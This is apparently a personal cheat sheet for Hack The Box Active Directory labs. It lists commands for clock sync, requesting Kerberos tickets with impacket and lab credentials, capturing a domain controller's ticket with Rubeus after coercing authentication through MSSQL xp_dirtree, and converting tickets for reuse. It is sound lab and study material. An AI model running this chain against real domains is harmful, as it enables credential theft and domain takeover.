### Time Sync
```bash
# ntpdate
sudo systemctl stop systemd-timesyncd
sudo systemctl disable systemd-timesyncd
sudo ntpdate {target dns}

# faketime
ntpdate -q {target dns}
faketime '2025-09-19 xx:xx:xx'
```

### getTGT
(When know ID:PW)
```bash
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
```
(In Windows)
```cmd
Rubeus.exe monitor /interval:10 /targetuser:DC01$
```
-> 이후 남의 자산에서 ex)mssql 아래와 같이 요청을 날려준다.
```mssql
xp_dirtree \\dc02.darkzero.ext\share
```
-> 이후 아래 커맨드로 포맷 맞춰줘야 한다
```bash
base64 -d DC01.kirbi.b64 > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
```

### Using kerberos-user
```bash
# kerberos user install
sudo apt-get install krb5-user
sudo apt install libsasl2-modules-gssapi-mit

# krb5.conf
echo '[libdefaults]
default_realm = VINTAGE.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
[realms]
VINTAGE.HTB = {
kdc = dc01.vintage.htb
admin_server = dc01.vintage.htb
}
[domain_realm]
.vintage.htb = VINTAGE.HTB
vintage.htb = VINTAGE.HTB' | tee -a krb5.conf

# get ticket
export KRB5_CONFIG=`pwd`/krb5.conf
sudo net time set -S vintage.htb
echo 'Rosaisbest123' | kinit p.rosa

# Use -k flag for kerberos authentication
```